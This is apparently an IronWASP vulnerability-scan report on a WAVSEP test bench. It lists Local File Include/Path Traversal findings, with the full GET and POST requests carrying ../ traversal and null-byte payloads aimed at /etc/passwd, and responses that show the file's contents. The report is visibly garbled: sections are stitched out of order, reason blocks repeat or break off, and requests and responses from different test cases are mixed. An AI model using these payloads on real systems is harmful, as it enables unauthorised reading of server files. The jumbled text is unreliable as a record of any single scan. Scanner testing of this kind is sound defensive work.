Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case54-LFI-FileClass-FilenameContext-BackslashTraversalRemoval-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp?target=
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd\0

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00 HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Reason 2:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd\0

Reason 2:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:

After that you can try changing the file name to something else and see if the server prints those file contents.

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-404Error/Case58-LFI-FileClass-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by using the file: protocol. The payload is /etc/passwd\0.txt

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp HTTP/1.1

Interesting part of Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.
The scanner reported the following text as being of interest in this case:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case13-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-NoPathReq-Read.jsp HTTP/1.1

Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Valid/Case17-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-SlashPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

----- END OF INTERESTING TEXT -----

Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2fetc%2fpasswd

Interesting part of Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.
The scanner reported the following text as being of interest in this case:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-200Identical/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp HTTP/1.1

Reason 1:

This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

----- END OF INTERESTING TEXT -----

The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=file%3a%2faaa..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.html

Interesting part of Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.
The scanner reported the following text as being of interest in this case:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

Reason 3:
IronWASP sent file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.jpg as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.jpg

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp HTTP/1.1

Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case11-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-NoPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case11-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-NoPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. This indicates that the etc/passwd file was loaded and its content printed in the response.

After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case19-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-SlashPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: application/octet-stream;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is ../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by using the file: protocol. The payload is /etc/passwd\0.txt

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2fetc%2fpasswd%00.txt

Interesting part of Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.
The scanner reported the following text as being of interest in this case:

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

Reason 2:
IronWASP sent /etc/passwd\0.html as payload to the application. This payload tries to refer to the file etc/passwd by using the file: protocol.If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case10-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultFullInput-NoPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent ../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.

Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp
Affected Parameter:target
Parameter Location:Body
Description:
Local File Include/Path Traversal was identified in the target parameter of the Body section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case05-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-AnyPathReq-Read.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B

target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

Response from the Server:

